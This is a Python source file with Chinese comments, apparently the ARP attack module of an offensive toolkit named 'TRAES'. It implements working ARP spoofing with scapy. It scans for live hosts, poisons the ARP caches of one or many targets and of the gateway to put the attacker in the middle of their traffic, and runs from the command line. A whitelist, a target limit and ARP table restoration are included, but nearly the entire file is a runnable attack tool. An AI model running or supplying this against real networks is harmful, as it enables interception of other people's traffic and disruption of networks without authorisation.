#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TRAES ARP攻击模块

实现ARP欺骗攻击功能，包括：
- 单目标ARP欺骗
- 多目标ARP欺骗
- 双向ARP欺骗
- ARP表恢复
- MAC地址随机化
- 白名单保护

作者: Security Researcher
版本: 1.0.0
"""

import sys
import time
import threading
import ipaddress
from typing import List, Optional, Dict, Any

try:
    from scapy.all import ARP, Ether, srp, send, get_if_hwaddr, conf
    from loguru import logger
    from colorama import Fore, Style
except ImportError as e:
    print(f"缺少必要的依赖库: {e}")
    print("请运行: pip install scapy loguru colorama")
    sys.exit(1)

class ARPAttack:
    """
    ARP攻击类
    
    实现各种ARP攻击功能，包括ARP欺骗、网络发现等。
    """
    
    def __init__(self, config: Dict[str, Any] = None):
        """
        初始化ARP攻击模块
        
        Args:
            config (dict): 配置字典
        """
        self.config = config or {}
        self.arp_config = self.config.get('attack', {}).get('arp', {})
        self.security_config = self.config.get('security', {})
        
        # 攻击参数
        self.interval = self.arp_config.get('interval', 1.0)
        self.restore_on_exit = self.arp_config.get('restore_on_exit', True)
        self.spoof_mode = self.arp_config.get('spoof_mode', 'bidirectional')
        self.max_targets = self.arp_config.get('max_targets', 50)
        
        # 白名单配置
        self.whitelist_enabled = self.security_config.get('whitelist', {}).get('enabled', True)
        self.whitelist_ips = set(self.security_config.get('whitelist', {}).get('ips', []))
        self.whitelist_macs = set(self.security_config.get('whitelist', {}).get('macs', []))
        
        # 内部状态
        self.running = False
        self.original_arp_table = {}
        self.attack_thread = None
        
        logger.info("ARP攻击模块初始化完成")
    
    def get_mac_address(self, ip: str, interface: str = None) -> Optional[str]:
        """
        获取指定IP地址的MAC地址
        
        Args:
            ip (str): 目标IP地址
            interface (str): 网络接口名称
            
        Returns:
            str: MAC地址，如果获取失败返回None
        """
        try:
            if interface:
                conf.iface = interface
                
            # 创建ARP请求包
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # 发送请求并接收响应
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            else:
                logger.warning(f"无法获取 {ip} 的MAC地址")
                return None
                
        except Exception as e:
            logger.error(f"获取MAC地址时出错: {e}")
            return None
    
    def discover_network(self, network: str, interface: str = None) -> List[Dict[str, str]]:
        """
        发现网络中的活跃主机
        
        Args:
            network (str): 网络地址（如 192.168.1.0/24）
            interface (str): 网络接口名称
            
        Returns:
            list: 包含IP和MAC地址的字典列表
        """
        logger.info(f"开始扫描网络: {network}")
        
        try:
            if interface:
                conf.iface = interface
                
            # 创建ARP请求包
            arp_request = ARP(pdst=network)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # 发送请求并接收响应
            answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]
            
            hosts = []
            for element in answered_list:
                host_info = {
                    'ip': element[1].psrc,
                    'mac': element[1].hwsrc
                }
                hosts.append(host_info)
                logger.info(f"发现主机: {host_info['ip']} - {host_info['mac']}")
            
            logger.info(f"网络扫描完成，发现 {len(hosts)} 个活跃主机")
            return hosts
            
        except Exception as e:
            logger.error(f"网络发现时出错: {e}")
            return []
    
    def is_whitelisted(self, ip: str, mac: str = None) -> bool:
        """
        检查IP或MAC地址是否在白名单中
        
        Args:
            ip (str): IP地址
            mac (str): MAC地址
            
        Returns:
            bool: 如果在白名单中返回True
        """
        if not self.whitelist_enabled:
            return False
            
        if ip in self.whitelist_ips:
            return True
            
        if mac and mac in self.whitelist_macs:
            return True
            
        return False
    
    def save_original_arp_entry(self, target_ip: str, gateway_ip: str):
        """
        保存原始ARP表项用于后续恢复
        
        Args:
            target_ip (str): 目标IP地址
            gateway_ip (str): 网关IP地址
        """
        try:
            target_mac = self.get_mac_address(target_ip)
            gateway_mac = self.get_mac_address(gateway_ip)
            
            if target_mac and gateway_mac:
                self.original_arp_table[target_ip] = {
                    'mac': target_mac,
                    'gateway_ip': gateway_ip,
                    'gateway_mac': gateway_mac
                }
                logger.debug(f"保存原始ARP表项: {target_ip} -> {target_mac}")
            
        except Exception as e:
            logger.error(f"保存ARP表项时出错: {e}")
    
    def restore_arp_table(self):
        """
        恢复原始ARP表
        """
        if not self.original_arp_table:
            logger.info("没有需要恢复的ARP表项")
            return
            
        logger.info("开始恢复ARP表...")
        
        for target_ip, info in self.original_arp_table.items():
            try:
                # 恢复目标主机的ARP表
                restore_target = ARP(
                    op=2,  # ARP回复
                    pdst=target_ip,
                    hwdst=info['mac'],
                    psrc=info['gateway_ip'],
                    hwsrc=info['gateway_mac']
                )
                
                # 恢复网关的ARP表
                restore_gateway = ARP(
                    op=2,  # ARP回复
                    pdst=info['gateway_ip'],
                    hwdst=info['gateway_mac'],
                    psrc=target_ip,
                    hwsrc=info['mac']
                )
                
                # 发送恢复包
                send(restore_target, verbose=False, count=3)
                send(restore_gateway, verbose=False, count=3)
                
                logger.info(f"已恢复 {target_ip} 的ARP表项")
                
            except Exception as e:
                logger.error(f"恢复ARP表项 {target_ip} 时出错: {e}")
        
        logger.info("ARP表恢复完成")
    
    def send_arp_spoof(self, target_ip: str, gateway_ip: str, 
                      target_mac: str = None, spoof_mac: str = None):
        """
        发送ARP欺骗包
        
        Args:
            target_ip (str): 目标IP地址
            gateway_ip (str): 网关IP地址
            target_mac (str): 目标MAC地址
            spoof_mac (str): 伪造的MAC地址
        """
        try:
            if not target_mac:
                target_mac = self.get_mac_address(target_ip)
                if not target_mac:
                    logger.error(f"无法获取目标 {target_ip} 的MAC地址")
                    return
            
            if not spoof_mac:
                spoof_mac = get_if_hwaddr(conf.iface)
            
            # 创建ARP欺骗包 - 告诉目标主机我们是网关
            arp_response_target = ARP(
                op=2,  # ARP回复
                pdst=target_ip,
                hwdst=target_mac,
                psrc=gateway_ip,
                hwsrc=spoof_mac
            )
            
            # 如果是双向欺骗，也欺骗网关
            if self.spoof_mode == 'bidirectional':
                gateway_mac = self.get_mac_address(gateway_ip)
                if gateway_mac:
                    arp_response_gateway = ARP(
                        op=2,  # ARP回复
                        pdst=gateway_ip,
                        hwdst=gateway_mac,
                        psrc=target_ip,
                        hwsrc=spoof_mac
                    )
                    send(arp_response_gateway, verbose=False)
            
            # 发送欺骗包
            send(arp_response_target, verbose=False)
            
        except Exception as e:
            logger.error(f"发送ARP欺骗包时出错: {e}")
    
    def attack_single_target(self, target_ip: str, gateway_ip: str, 
                           interface: str = None, spoof_mac: str = None):
        """
        对单个目标进行ARP欺骗攻击
        
        Args:
            target_ip (str): 目标IP地址
            gateway_ip (str): 网关IP地址
            interface (str): 网络接口名称
            spoof_mac (str): 伪造的MAC地址
        """
        # 检查白名单
        if self.is_whitelisted(target_ip):
            logger.warning(f"目标 {target_ip} 在白名单中，跳过攻击")
            return
        
        if interface:
            conf.iface = interface
        
        logger.info(f"开始ARP欺骗攻击: {target_ip} -> {gateway_ip}")
        
        # 保存原始ARP表项
        if self.restore_on_exit:
            self.save_original_arp_entry(target_ip, gateway_ip)
        
        # 获取目标MAC地址
        target_mac = self.get_mac_address(target_ip)
        if not target_mac:
            logger.error(f"无法获取目标 {target_ip} 的MAC地址，攻击终止")
            return
        
        self.running = True
        packet_count = 0
        
        try:
            while self.running:
                self.send_arp_spoof(target_ip, gateway_ip, target_mac, spoof_mac)
                packet_count += 1
                
                if packet_count % 10 == 0:
                    logger.info(f"已发送 {packet_count} 个ARP欺骗包")
                
                time.sleep(self.interval)
                
        except KeyboardInterrupt:
            logger.info("收到中断信号，停止攻击")
        except Exception as e:
            logger.error(f"ARP攻击过程中出错: {e}")
        finally:
            self.running = False
            if self.restore_on_exit:
                self.restore_arp_table()
    
    def attack_multiple_targets(self, targets: List[str], gateway_ip: str,
                              interface: str = None, spoof_mac: str = None):
        """
        对多个目标进行ARP欺骗攻击
        
        Args:
            targets (list): 目标IP地址列表
            gateway_ip (str): 网关IP地址
            interface (str): 网络接口名称
            spoof_mac (str): 伪造的MAC地址
        """
        # 过滤白名单
        filtered_targets = []
        for target in targets:
            if not self.is_whitelisted(target):
                filtered_targets.append(target)
            else:
                logger.warning(f"目标 {target} 在白名单中，跳过")
        
        if not filtered_targets:
            logger.warning("没有有效的攻击目标")
            return
        
        # 限制目标数量
        if len(filtered_targets) > self.max_targets:
            logger.warning(f"目标数量超过限制 ({self.max_targets})，只攻击前 {self.max_targets} 个目标")
            filtered_targets = filtered_targets[:self.max_targets]
        
        if interface:
            conf.iface = interface
        
        logger.info(f"开始多目标ARP欺骗攻击，目标数量: {len(filtered_targets)}")
        
        # 保存原始ARP表项
        if self.restore_on_exit:
            for target in filtered_targets:
                self.save_original_arp_entry(target, gateway_ip)
        
        # 获取所有目标的MAC地址
        target_macs = {}
        for target in filtered_targets:
            mac = self.get_mac_address(target)
            if mac:
                target_macs[target] = mac
            else:
                logger.warning(f"无法获取目标 {target} 的MAC地址，将跳过")
        
        self.running = True
        packet_count = 0
        
        try:
            while self.running:
                for target_ip in target_macs:
                    if not self.running:
                        break
                    
                    target_mac = target_macs[target_ip]
                    self.send_arp_spoof(target_ip, gateway_ip, target_mac, spoof_mac)
                    packet_count += 1
                
                if packet_count % (len(target_macs) * 10) == 0:
                    logger.info(f"已发送 {packet_count} 个ARP欺骗包")
                
                time.sleep(self.interval)
                
        except KeyboardInterrupt:
            logger.info("收到中断信号，停止攻击")
        except Exception as e:
            logger.error(f"多目标ARP攻击过程中出错: {e}")
        finally:
            self.running = False
            if self.restore_on_exit:
                self.restore_arp_table()
    
    def parse_ip_range(self, ip_range: str) -> List[str]:
        """
        解析IP地址范围
        
        Args:
            ip_range (str): IP地址范围（支持CIDR、范围等格式）
            
        Returns:
            list: IP地址列表
        """
        ips = []
        
        try:
            if '/' in ip_range:
                # CIDR格式
                network = ipaddress.ip_network(ip_range, strict=False)
                ips = [str(ip) for ip in network.hosts()]
            elif '-' in ip_range:
                # 范围格式 (如 192.168.1.1-192.168.1.100)
                start_ip, end_ip = ip_range.split('-')
                start = ipaddress.ip_address(start_ip.strip())
                end = ipaddress.ip_address(end_ip.strip())
                
                current = start
                while current <= end:
                    ips.append(str(current))
                    current += 1
            else:
                # 单个IP地址
                ips = [ip_range]
                
        except Exception as e:
            logger.error(f"解析IP范围时出错: {e}")
            
        return ips
    
    def stop_attack(self):
        """
        停止ARP攻击
        """
        logger.info("正在停止ARP攻击...")
        self.running = False
        
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=5)
        
        if self.restore_on_exit:
            self.restore_arp_table()
    
    def run(self, args):
        """
        运行ARP攻击模块
        
        Args:
            args: 命令行参数对象
        """
        if not args.target:
            logger.error("请指定目标IP地址或IP范围")
            return
        
        if not args.gateway:
            logger.error("请指定网关IP地址")
            return
        
        try:
            # 解析目标IP
            targets = self.parse_ip_range(args.target)
            
            if not targets:
                logger.error("无效的目标IP地址")
                return
            
            logger.info(f"解析到 {len(targets)} 个目标IP地址")
            
            # 根据目标数量选择攻击方式
            if len(targets) == 1:
                self.attack_single_target(
                    targets[0], 
                    args.gateway,
                    args.interface,
                    args.spoof_mac
                )
            else:
                self.attack_multiple_targets(
                    targets,
                    args.gateway,
                    args.interface,
                    args.spoof_mac
                )
                
        except Exception as e:
            logger.error(f"ARP攻击执行失败: {e}")
        finally:
            self.stop_attack()

# 如果直接运行此模块
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="TRAES ARP攻击模块")
    parser.add_argument('--target', '-t', required=True, help='目标IP地址或范围')
    parser.add_argument('--gateway', '-g', required=True, help='网关IP地址')
    parser.add_argument('--interface', '-i', help='网络接口名称')
    parser.add_argument('--spoof-mac', help='伪造的MAC地址')
    parser.add_argument('--interval', type=float, default=1.0, help='发包间隔')
    
    args = parser.parse_args()
    
    # 创建攻击实例
    attack = ARPAttack()
    attack.interval = args.interval
    
    try:
        attack.run(args)
    except KeyboardInterrupt:
        print("\n用户中断攻击")
        attack.stop_attack()